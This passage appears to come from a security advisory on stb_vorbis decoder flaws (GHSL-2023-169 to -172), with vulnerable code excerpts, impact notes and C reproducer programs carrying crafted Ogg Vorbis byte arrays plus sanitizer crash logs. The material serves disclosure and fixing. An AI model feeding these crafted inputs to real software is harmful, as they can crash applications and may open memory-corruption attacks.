                            0x69,0x73,0x00,0x42,0x43,0x56,0x27,0x01,0x04,
                            0x00,0x00,0x04,0x20,0x04,0x00,0x00,0x00,0x40,
                            0x00,0x00,0x50,0x00,0x01,0x00,0x00,0x81,0x00,
                            0x00,0x08,0xd2,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x80,0x0f,0x20,0x10,0x28,0x30,0x18,0x15,
                            0x15,0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x8a,0x8a,0xff,0x00};
    size_t size = sizeof(data);

    stb_vorbis* out = stb_vorbis_open_memory(data, size, NULL, NULL);
    stb_vorbis_close(out);
    return 0;
}

```

1. Run the program to hit the error.

```
/src/stb/tests/../stb_vorbis.c:4107:10: runtime error: index 15 out of bounds for type 'uint8[15]' (aka 'unsigned char[15]')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /src/stb/tests/../stb_vorbis.c:4107:10 in

```
### Issue 12: Attempt to free an uninitialized memory pointer in `vorbis_deinit` (`GHSL-2023-169`)

A crafted file may trigger memory allocation failure in [`start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3660-L3677) at [1]. In that case the function returns early [2], but some of the pointers in `f->comment_list` are left initialized [3].

```
   f->comment_list_length = get32_packet(f);
   f->comment_list = NULL;
   if (f->comment_list_length > 0)
   {
      f->comment_list = (char**) setup_malloc(f, sizeof(char*) * (f->comment_list_length)); // [3]
      if (f->comment_list == NULL)                  return error(f, VORBIS_outofmem);
   }

   for(i=0; i < f->comment_list_length; ++i) {
      len = get32_packet(f);
      f->comment_list[i] = (char*)setup_malloc(f, sizeof(char) * (len+1)); // [1] OOM
      if (f->comment_list[i] == NULL)               return error(f, VORBIS_outofmem); // [2]

      for(j=0; j < len; ++j) {
         f->comment_list[i][j] = get8_packet(f);
      }
      f->comment_list[i][len] = (char)'\0';
   }

```

Later `setup_free` is called on these pointers in [`vorbis_deinit`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4208-L4215) [4].

```
static void vorbis_deinit(stb_vorbis *p)
{
   int i,j;

   setup_free(p, p->vendor);
   for (i=0; i < p->comment_list_length; ++i) {
      setup_free(p, p->comment_list[i]); // [4]
   }

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x7a,0x18,0xfe,0xa9,0x00,0x53,
                            0x00,0xe3,0xb5,0x21,0x68,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x6b,0x0e,0xa0,0x75,0x01,0x1e,0x01,0x76,0x6f,0x72,0x62,
                            0x69,0x73,0x00,0x00,0x00,0x00,0x01,0xfb,0x07,0xae,0x69,
                            0x73,0x00,0x00,0x00,0x00,0x2e,0x09,0x3c,0xff,0x30,0x00,
                            0x01,0xa9,0xf9,0x4f,0x67,0x67,0x53,0x00,0x00,0x00,0x7e,
                            0x79,0x6f,0x42,0x0c,0xc5,0x97,0x21,0x68,0x00,0x00,0x01,
                            0x00,0x00,0x00,0x6f,0x11,0x00,0x00,0x00,0x03,0x76,0x6f,
                            0x72,0x62,0x69,0x73,0x00,0x00,0x00,0x00,0x2e};
    size_t size = sizeof(data);

    int chan, samplerate;
    short *output;
    int samples = stb_vorbis_decode_memory(data, size, &chan, &samplerate, &output);
    if (samples >= 0)
        free(output);
    return 0;
}

```

1. Run the program with an instruction that allocator may fail (otherwise ASAN will quit early with `AddressSanitizer: requested allocation size ... exceeds maximum supported size`): `ASAN_OPTIONS=allocator_may_return_null=1 <program name>` to hit the error.

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==217447==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x00000041f6d4 bp 0x000000000000 sp 0x7ffd3e146c60 T0)
==217447==The signal is caused by a READ memory access.
    #0 0x41f6d4 in atomic_compare_exchange_strong<__sanitizer::atomic_uint8_t> /src/llvm-project/compiler-rt/lib/asan/../sanitizer_common/sanitizer_atomic_clang.h:81:10
    #1 0x41f6d4 in AtomicallySetQuarantineFlagIfAllocated /src/llvm-project/compiler-rt/lib/asan/asan_allocator.cpp:610:10
    #2 0x41f6d4 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) /src/llvm-project/compiler-rt/lib/asan/asan_allocator.cpp:685:10
    #3 0x49e5d5 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:53:3
    #4 0x4dcedb in setup_free(stb_vorbis*, void*) tests/../stb_vorbis.c:966:4
    #5 0x4dbe57 in vorbis_deinit(stb_vorbis*) tests/../stb_vorbis.c:4214:7
    #6 0x4f9638 in stb_vorbis_open_memory tests/../stb_vorbis.c:5122:4
    #7 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20

```
### Issue 13: Null pointer dereference in `vorbis_deinit` (`GHSL-2023-170`)

A crafted file may trigger memory allocation failure in [`start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3660-L3666) at [1]. In that case the function returns early [2], the `f->comment_list` is set to `NULL`, but `f->comment_list_length` is not reset.

```
   f->comment_list_length = get32_packet(f);
   f->comment_list = NULL;
   if (f->comment_list_length > 0)
   {
      f->comment_list = (char**) setup_malloc(f, sizeof(char*) * (f->comment_list_length)); // [1] OOM
      if (f->comment_list == NULL)                  return error(f, VORBIS_outofmem); // [2]
   }

```

Later in [`vorbis_deinit`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4208-L4215) it tries to dereference the `NULL` pointer at [3].

```
static void vorbis_deinit(stb_vorbis *p)
{
   int i,j;

   setup_free(p, p->vendor);
   for (i=0; i < p->comment_list_length; ++i) {
      setup_free(p, p->comment_list[i]); // [3]
   }

```
#### Impact

This issue may lead to denial of service.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0xb6,0xe4,0xb5,0x67,0x00,0x00,0x00,0x00,0x3b,0x21,0x03,0x0f,0x01,0x1e,
                            0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,0x00,0x00,0x00,0x01,0x44,0xac,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x38,0x01,0x00,0x00,0x00,0x00,0x00,
                            0xb8,0x01,0x4f,0x67,0x67,0x53,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0xb6,0xe4,0xb5,0x67,0x01,0x00,0x00,0x00,0x83,0xb5,0x32,0x7b,
                            0x0e,0x3b,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
                            0x81,0x03,0x76,0x6f,0x72,0x62,0x69,0x73,0x2b,0x00,0x00,0x00,0x58,0x69,
                            0x70,0x68,0x2e,0x4f,0x72,0x67,0x20,0x6c,0x69,0x62,0x56,0x6f,0x72,0x62,
                            0x69,0x73,0x20,0x73,0xbe,0x61,0x97,0xcc,0x7c,0x55,0x7e,0xc6,0x03,0x1a,
                            0x85,0x7f,0x3d,0x39,0x3f,0x7f,0x8b,0xa9,0x41,0x21,0x11,0x14,0xf7,0x47,
                            0x7a,0x38,0x30,0x05,0x48,0xa5,0x77,0x3b,0x31,0x88,0xaa,0xba,0xd9,0xdd,
                            0x8f,0x4e,0xfd,0xbd,0xa2,0xa7,0x0e,0xb7,0x02,0x78,0x00,0x3e,0x96,0xfc,
                            0xef,0xac,0x5f,0x9a,0x02,0x36,0x00,0x82,0x2a,0x82,0x12,0x0c,0x04,0x22,
                            0x02,0x00,0x00,0x3c,0x58,0x06,0x9e,0x8f,0x59,0xd9,0xb0,0x6f,0x68,0xea,
                            0x52,0x32,0x1f,0x02,0x66,0xd3,0x81,0xa5,0x77,0xb1,0x23,0x2f,0x69,0xeb,
                            0x3f,0x61,0x04,0x65,0x9d,0xcf,0x87,0x93,0x9c,0x30,0xab,0x98,0xc1,0x29,
                            0x79,0x9c,0xb3,0x84,0xe9,0x16,0x00,0x1a,0x00,0x77,0xc4,0x84,0x86,0x31,
                            0x00,0x34,0xa0,0x03};
    size_t size = sizeof(data);

    int chan, samplerate;
    short *output;
    int samples = stb_vorbis_decode_memory(data, size, &chan, &samplerate, &output);
    if (samples >= 0)
        free(output);
    return 0;
}

```

1. Run the program to hit the error.

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==264664==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x0000004dbe50 bp 0x7ffddf2f2e30 sp 0x7ffddf2f2b40 T0)
==264664==The signal is caused by a READ memory access.
    #0 0x4dbe50 in vorbis_deinit(stb_vorbis*) tests/../stb_vorbis.c:4214:21
    #1 0x4f9638 in stb_vorbis_open_memory tests/../stb_vorbis.c:5122:4
    #2 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20

```
### Issue 14: Out of bounds heap buffer write (`GHSL-2023-171`)

A crafted file may trigger memory write past an allocated heap buffer in [`start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3660-L3677) at [1]. The root cause is a potential integer overflow `sizeof(char*) * (f->comment_list_length)` at [2] which may make `setup_malloc` allocate less memory than required. Since there is another integer overflow at [1] attacker may overflow it too to force `setup_malloc` to return `0` and make the exploit more reliable.

```
   f->comment_list_length = get32_packet(f);
   f->comment_list = NULL;
   if (f->comment_list_length > 0)
   {
      f->comment_list = (char**) setup_malloc(f, sizeof(char*) * (f->comment_list_length)); // [2] Int overflow
      if (f->comment_list == NULL)                  return error(f, VORBIS_outofmem);
   }

   for(i=0; i < f->comment_list_length; ++i) {
      len = get32_packet(f);
      f->comment_list[i] = (char*)setup_malloc(f, sizeof(char) * (len+1)); // [1] OOB
      if (f->comment_list[i] == NULL)               return error(f, VORBIS_outofmem);

      for(j=0; j < len; ++j) {
         f->comment_list[i][j] = get8_packet(f);
      }
      f->comment_list[i][len] = (char)'\0';
   }

```

Similar potential vulnerability exists in other `setup_malloc` use cases as:

* [`f->codebooks = (Codebook *) setup_malloc(f, sizeof(*f->codebooks) * f->codebook_count);`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3716)
* [`c->codewords = (uint32 *) setup_malloc(f, sizeof(c->codewords[0]) * c->entries);`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3802)
* etc.

#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0xb6,0xe4,0xb5,0x67,0x00,0x00,0x00,0x00,0x3b,0x21,0x03,0x0f,0x01,0x1e,
                            0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,0x00,0x00,0x00,0x01,0x44,0xac,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x38,0x01,0x00,0x00,0x00,0x00,0x00,
                            0xb8,0x01,0x4f,0x67,0x67,0x53,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0xb6,0xe4,0xb5,0x67,0x01,0x00,0x00,0x00,0x83,0xb5,0x32,0x7b,
                            0x0e,0x63,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
                            0x81,0x03,0x76,0x6f,0x72,0x62,0x69,0x73,0x2b,0x00,0x00,0x00,0x58,0x69,
                            0x70,0x68,0x2e,0x4f,0x72,0x67,0x20,0x6c,0x69,0x62,0x56,0x6f,0x72,0x62,
                            0x69,0x73,0x20,0x73,0xbe,0x61,0x97,0xcc,0x7c,0x55,0x7e,0xc6,0x03,0x1a,
                            0x85,0x7f,0x3d,0x39,0x3f,0x7f,0x8b,0xa9,0x41,0x21,0x11,0x14,0xf7,0x01,
                            0x00,0x00,0x20,0x00,0x00,0x00,0x00};
    size_t size = sizeof(data);

    int chan, samplerate;
    short *output;
    int samples = stb_vorbis_decode_memory(data, size, &chan, &samplerate, &output);
    if (samples >= 0)
        free(output);
    return 0;
}

```

1. Run the program to hit the error.

```
==359215==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000018 at pc 0x0000004e45b7 bp 0x7ffcdb4f8df0 sp 0x7ffcdb4f8de8
WRITE of size 8 at 0x602000000018 thread T0
    #0 0x4e45b6 in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3670:26
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8
    #2 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20

```
### Issue 15: Wild address read in `vorbis_decode_packet_rest` (`GHSL-2023-172`)

A crafted file may trigger out of bounds read in [`DECODE`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3231) macro [when `var` is negative](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L1754-L1756) [1]

```
#define DECODE(var,f,c)                                       \
   DECODE_RAW(var,f,c)                                        \
   if (c->sparse) var = c->sorted_values[var]; // [1] OOB

```

As it can be seen in the definition of [`DECODE_RAW`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L1717-L1729) negative `var` is a valid value [2] and [3] (`codebook_decode_scalar_raw` may also return a negative value).

```
#define DECODE_RAW(var, f,c)                                  \
   if (f->valid_bits < STB_VORBIS_FAST_HUFFMAN_LENGTH)        \
      prep_huffman(f);                                        \
   var = f->acc & FAST_HUFFMAN_TABLE_MASK;                    \
   var = c->fast_huffman[var];                                \
   if (var >= 0) {                                            \
      int n = c->codeword_lengths[var];                       \
      f->acc >>= n;                                           \
      f->valid_bits -= n;                                     \
      if (f->valid_bits < 0) { f->valid_bits = 0; var = -1; } \ // [2]
   } else {                                                   \
      var = codebook_decode_scalar_raw(f,c);                  \ // [3]
   }

```
#### Impact

This issue may be used to leak internal memory allocation information.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0x00,0x2b,0x00,0x00,0x00,0x00,0x00,0x00,0x39,0x30,0x00,0x00,
                            0x00,0x00,0x00,0x00,0xf1,0x49,0x93,0x48,0x01,0x1e,0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,
                            0x00,0x00,0x00,0x02,0x44,0xac,0x00,0x00,0xff,0xff,0xff,0xff,0x8f,0xb5,0x01,0x00,0xff,0xff,
                            0xff,0xff,0xb8,0x01,0x4f,0x67,0x67,0x53,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x39,0x30,0x00,0x00,0x01,0x00,0x00,0x00,0x65,0x9b,0x7d,0x94,0x0a,0x63,0xff,0xff,0xff,0xff,
                            0xff,0xff,0xff,0xff,0x3c,0x03,0x76,0x6f,0x72,0x62,0x69,0x73,0x20,0x00,0x00,0x00,0x58,0x6f,
                            0x7c,0x69,0x70,0x80,0x72,0x70,0x75,0x68,0x62,0x68,0xd4,0x75,0x6f,0x56,0x6f,0x72,0x62,0x69,
                            0x73,0x20,0x49,0x08,0x32,0x30,0x30,0x31,0x31,0x32,0x33,0x32,0x02,0x00,0x00,0x00,0x1c,0x00,
                            0x00,0x00,0x54,0x49,0x54,0x4c,0x45,0x3d,0x47,0x72,0x6f,0x6f,0x76,0x65,0x20,0x49,0x73,0x20,
                            0x49,0x6e,0x20,0x54,0x68,0x65,0xe9,0x48,0x65,0x61,0x72,0x74,0x0f,0x00,0x00,0x00,0x41,0x52,
                            0x54,0x49,0x53,0x54,0x3d,0x44,0x65,0x65,0x2d,0x6c,0x6d,0x74,0x65,0x01,0x05,0x76,0x6f,0x72,
                            0x62,0x69,0x73,0x22,0x42,0x43,0x56,0x01,0x00,0x40,0x00,0x00,0x06,0xc3,0xb2,0x2d,0x47,0xc4,
                            0x05,0x2c,0xc5,0xa3,0x6a,0x36,0x6c,0xc0,0xb4,0x01,0x00,0x00,0x00,0x10,0x1a,0xb2,0x0a,0x00,
                            0x00,0x02,0x00,0x30,0x38,0x92,0xa9,0x29,0x8e,0x29,0x5a,0x9a,0x0c,0x9a,0xa3,0xc9,0x9e,0xa4,
                            0xd9,0xa6,0x66,0x02,0xd1,0xf2,0x98,0x96,0x67,0xbb,0x9a,0x08,0xd8,0x2e,0x36,0x00,0x40,0x68,
                            0xc8,0x2a,0x00,0x00,0x10,0x00,0xc0,0x23,0x49,0x92,0x24,0x49,0x92,0x24,0x49,0x92,0x24,0x49,
                            0x96,0x64,0x49,0x96,0xa4,0x49,0x9a,0xa4,0x49,0x9a,0xa4,0x49,0x9e,0xe5,0x59,0xa2,0x25,0x5a,
                            0xa2,0x65,0x5a,0xa6,0x66,0x6a,0xaa,0xa6,0x6a,0xaa,0x27,0x7b,0xae,0xe7,0x8a,0xb2,0xe8,0x9a,
                            0xba,0xa9,0xab,0x54,0xaa,0xee,0xda,0x36,0x9b,0x6c,0xeb,0x6c,0x5b,0x07,0x9d,0x0e,0x40,0x07,
                            0x00,0x00,0x00,0x08,0x0d,0x59,0x05,0x00,0x64,0x00,0x00,0xe8,0x38,0x8e,0xe3,0x48,0x8a,0xa4,
                            0x48,0x8e,0xe4,0x48,0x92,0x64,0x59,0x96,0xa5,0x69,0x9a,0x06,0x84,0x86,0xac,0x02,0x00,0x64,
                            0x00,0x00,0x04,0x00,0x00,0x50,0x0c,0x45,0x71,0x14,0xc9,0x91,0x24,0xcf,0xf3,0x34,0xcf,0xe3,
                            0x01,0x80,0xd0,0x90,0x55,0x00,0x00,0x20,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x84,0x86,0xac,0x02,0x00,0x24,0x00,0x00,0x74,
                            0x1c,0xc7,0x71,0x24,0x45,0x72,0x1c,0xc7,0x71,0x1c,0x47,0x92,0x80,0xd0,0x90,0x55,0x00,0x80,
                            0x0c,0x00,0x80,0x00,0x00,0x14,0x45,0x71,0x1c,0xc7,0x71,0x24,0x49,0x92,0x24,0x4b,0xb2,0x2c,
                            0xcd,0xd2,0x34,0x4f,0xf3,0x34,0xd1,0x33,0x4d,0x4f,0x14,0x81,0xd0,0x90,0x55,0x00,0x00,0x20,
                            0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x2c,0x83,0xe2,0x38,0x0e,0xc7,0x91,0x1c,0x4b,0x22,
                            0x49,0x92,0x84,0x05,0x00,0x00,0xb0,0x00,0x00,0x00,0x00,0x80,0xd0,0x90,0x55,0x00,0x00,0x02,
                            0x00,0x00,0x20,0x8c,0x22,0x88,0x31,0x20,0x34,0x64,0x15,0x00,0x00,0x01,0x00,0x60,0x70,0x14,
                            0x92,0x26,0x32,0x3c,0x91,0x05,0x20,0x34,0x64,0x15,0x00,0x00,0x04,0x00,0x60,0x30,0x2c,0xa2,
                            0x24,0x32,0x35,0x11,0x68,0x8a,0x45,0x94,0x44,0xb6,0xaa,0x02,0x59,0x74,0xc9,0xa6,0x4b,0x97,
                            0x75,0x00,0x00,0x00,0x84,0x86,0xac,0x02,0x00,0x80,0x00,0x00,0x0c,0x8a,0x24,0x6b,0x8e,0x65,
                            0x8a,0x9a,0xe9,0x83,0xa5,0x68,0xbe,0x26,0x79,0x3c,0x49,0x05,0xae,0x67,0x72,0x35,0x55,0x57,
                            0x3d,0x55,0x07,0x6c,0x74,0x5b,0x06,0x00,0x42,0x43,0x56,0x01,0x00,0x20,0x00,0x00,0x07,0xb2,
                            0xce,0x20,0x34,0x64,0x15,0x00,0x00,0x08,0x00,0x20,0x00,0x00,0x00,0x40,0x51,0x1c,0xc5,0x71,
                            0x24,0x47,0x72,0x24,0xc9,0x92,0x2c,0xc9,0xb2,0x2c,0x4d,0xd3,0x3c,0x4f,0x14,0x45,0xd1,0x33,
                            0x45,0x98,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08,0x0d,0x59,0x05,0x00,0x80,0x00,0x00,
                            0x10,0xc6,0x18,0x63,0x10,0x42,0x08,0x21,0xa4,0x90,0x42,0x0c,0x31,0xe5,0x94,0x53,0x90,0x49,
                            0x46,0x1d,0x05,0x42,0x43,0x56,0x01,0x00,0x80,0x00,0x00,0x02,0x00,0x00,0x00,0x0c,0x4b,0xb1,
                            0x14,0x4f,0xf1,0x1c,0xcf,0x51,0x1d,0x53,0x22,0xa9,0x12,0x4b,0xd5,0x78,0x34,0x1e,0x8f,0xc8,
                            0xa4,0x32,0x81,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x34,0x64,0x15,0x00,0x20,0x01,0x00,
                            0xa0,0x23,0x39,0x92,0x23,0x29,0x92,0xe2,0x28,0x8e,0x23,0x49,0x92,0x04,0x84,0x86,0xac,0x02,
                            0xff,0x64,0x00,0x00,0x04,0x00,0x60,0x38,0x8a,0xa4,0x48,0x8a,0xa5,0x68,0x8e,0x67,0x79,0x9a,
                            0x68,0x9a,0xa6,0xab,0xaa,0xaa,0x2b,0xbb,0x64,0x17,0x17,0x08,0x0d,0x59,0x05,0x00,0x00,0x02,
                            0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x42,0x43,0x56,0x01,0xff,0x12,0x00,0x00,0x3a,0x8e,0xe3,0x38,0x8e,0xe3,0x38,0x8e,0xe3,0x38,
                            0x8e,0xe4,0x48,0x40,0x68,0xc8,0x2a,0x00,0x40,0x06,0x00,0x40,0x00,0x00,0x86,0x63,0x38,0x8a,
                            0xe5,0x68,0x92,0x27,0x79,0x96,0x67,0x79,0x9a,0xa7,0x79,0x9e,0xe7,0x79,0x9e,0x28,0x9a,0xa2,
                            0x29,0x8a,0x40,0x68,0xc8,0x2a,0x00,0x00,0x10,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x8a,
                            0xa3,0x38,0x8e,0xe3,0x48,0x92,0xe4,0xb0,0x48,0x96,0x23,0x49,0x16,0x8b,0x24,0x01,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x20,0x34,0x64,0x25,0x00,0x00,0x04,0x00,0x60,0x01,0x57,0x95,0x79,0x9e,
                            0x08,0x2c,0xc7,0x32,0x41,0x93,0x2c,0x13,0x44,0x4d,0x13,0x21,0x81,0xe3,0x98,0x0a,0x28,0x8a,
                            0x27,0x7a,0x8e,0x63,0x79,0x9a,0x0c,0x84,0x86,0xac,0x08,0x00,0xe2,0x04,0x00,0x0c,0x8e,0x03,
                            0xcd,0x82,0x65,0xc1,0x75,0x01,0x8e,0x65,0x41,0xf4,0xe0,0x89,0xd0,0x65,0x80,0x63,0x59,0xf0,
                            0x44,0x88,0x1e,0x64,0x1b,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xcd,0x13,0x21,
                            0x8a,0x10,0x4d,0xd8,0x32,0xc0,0x12,0x3d,0x88,0x22,0x4c,0x11,0xae,0x0d,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x80,0x25,0x7a,0x30,0x45,0x88,0x22,0x64,0x19,0x60,0x79,0x22,0x44,
                            0x13,0xa2,0x08,0x59,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x95,0x6d,0xc8,
                            0x36,0x64,0x19,0xba,0x0e,0x70,0x75,0x19,0xb2,0x0c,0x59,0x86,0xae,0x03,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x02,0x00,0x00,0x07,0xdb,0xff,0x00,0x02,0x4c,0x28,0x03,0x85,0x86,0xac,0x04,0x00,0xa2,0x00,
                            0x00,0x0c,0x8a,0x22,0x49,0x40,0x92,0x34,0x0b,0x48,0x92,0xa5,0x01,0xcf,0x13,0x45,0x80,0x29,
                            0x02,0x64,0x17,0xe0,0xba,0x00,0xdb,0x06,0x00,0x02,0x00,0x00,0x09,0xea,0x64,0xb8,0x02,0x6c,
                            0xd0,0x94,0x58,0x1c,0xa0,0xd0,0x90,0x95,0x00,0x40,0x48,0x00,0x80,0x43,0x51,0x24,0xc9,0xb2,
                            0x3c,0x0f,0x80,0xe3,0x58,0x96,0xa6,0x79,0x22,0x00,0xc7,0xb1,0x2c,0x4d,0x13,0x3d,0x00,0x9e,
                            0xe7,0x79,0xa2,0x68,0x9a,0x00,0xf0,0x3c,0x51,0x34,0x4d,0x00,0xa8,0xaa,0xaa,0xaa,0x2a,0x00,
                            0x54,0xd5,0x54,0x55,0x15,0x00,0xb2,0x2c,0xcb,0xb6,0x0c,0x00,0x64,0x59,0x96,0x01,0x80,0xae,
                            0xfb,0x3a,0x00,0xb0,0x75,0x5f,0x07,0x00,0xc2,0x30,0x1c,0x01,0x00,0x61,0x08,0x00,0x18,0x4b,
                            0x00,0xc0,0x58,0x02,0x00,0xc6,0x11,0x00,0x00,0x40,0x00,0x00,0xc0,0x81,0x03,0x00,0x40,0x80,
                            0x11,0x87,0x92,0x51,0x65,0x11,0x30,0x9a,0x70,0xe1,0x01,0x28,0x34,0x64,0x25,0x00,0x10,0x0e,
                            0x00,0x60,0x50,0x0c,0xcb,0xf2,0x3c,0x55,0x05,0xd5,0x4b,0xf3,0x3c,0xd3,0x94,0x65,0xc0,0xd3,
                            0x2c,0xcf,0x33,0x4d,0xd9,0x05,0xa8,0xae,0xaa,0xba,0xaa,0xad,0x03,0x5c,0xd3,0x75,0x65,0x59,
                            0xd7,0x01,0xb6,0xf0,0xea,0xb6,0xae,0xfb,0x00,0xb6,0xee,0xea,0xba,0x31,0x04,0x90,0x85,0x5d,
                            0x58,0x02,0x50,0x5e,0x63,0x27,0x04,0x10,0xda,0xca,0x12,0x00,0x5d,0x99,0x19,0x01,0xf0,0x29,
                            0x01,0xc0,0x26,0x04,0xc0,0x68,0x04,0x00,0x84,0x40,0x00,0x00,0xe6,0x82,0x00,0x00,0x70,0x81,
                            0xcd,0x31,0xac,0x24,0x9d,0x15,0x8e,0x06,0x17,0x1a,0xb2,0x12,0x00,0x88,0x01,0x00,0x20,0x0c,
                            0x41,0x08,0x21,0x87,0x90,0x42,0x4a,0x31,0x84,0x90,0x52,0xca,0x31,0xc6,0x18,0x63,0xce,0x39,
                            0xc6,0x18,0x83,0x10,0x3a,0xe7,0x1c,0x84,0x90,0x31,0xe7,0x04,0x00,0x00,0x0e,0x38,0x00,0x00,
                            0x04,0x98,0x98,0x98,0xc2,0x42,0x43,0x56,0x04,0x00,0x51,0x00,0x00,0x06,0x45,0x01,0x1c,0x49,
                            0x02,0x1c,0x49,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x01,0x0e,0x00,0x00,
                            0x01,0x16,0x42,0xa1,0x21,0x2b,0x01,0x80,0x28,0x00,0x00,0x83,0x62,0x48,0x8e,0x66,0x79,0x1e,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x80,0x02,0x07,0x00,0x80,0x00,0x1b,
                            0x31,0x25,0x24,0x07,0x28,0x34,0x64,0x25,0x00,0x90,0x0a,0x00,0x60,0x50,0x0c,0xcb,0x72,0x55,
                            0x40,0xb3,0x3c,0xcf,0x24,0x03,0x9a,0x27,0x89,0x1a,0x19,0x20,0x52,0xc9,0x00,0x44,0xd7,0x04,
                            0xe0,0x52,0xc9,0x00,0x64,0x26,0x00,0x00,0x00,0x19,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,
                            0x00,0x48,0xb9,0xca,0xff,0xcd,0x32,0xd9,0xb0,0x3a,0xc2,0x49,0xd1,0x58,0x60,0xa1,0x21,0x2b,
                            0x01,0x80,0x08,0x01,0x00,0x87,0xa2,0x48,0x92,0x65,0x69,0x9a,0xe6,0x79,0x9e,0xe7,0x89,0x9e,
                            0xe7,0x79,0x9e,0x28,0x6a,0x96,0xa5,0x69,0x9a,0xe7,0x79,0x9e,0x28,0x8a,0xa2,0x69,0x8a,0xa2,
                            0x28,0x8a,0xa6,0x29,0x5b,0x96,0xa6,0x79,0x9e,0xe7,0x89,0x9e,0x28,0x8a,0xa2,0x28,0x8a,0xa2,
                            0x28,0x9a,0xa6,0x2d,0x8a,0x9e,0x28,0x8a,0xa2,0x69,0x9a,0xa6,0x69,0x9a,0xa6,0x6a,0x9a,0xa6,
                            0xa9,0xaa,0xb2,0x29,0x8a,0x9e,0x28,0x9a,0xa2,0x29,0x9a,0xa6,0x69,0x9a,0xa6,0x69,0x9a,0xa6,
                            0x69,0xca,0xaa,0x2c,0x9a,0xa6,0x69,0xaa,0xa6,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,
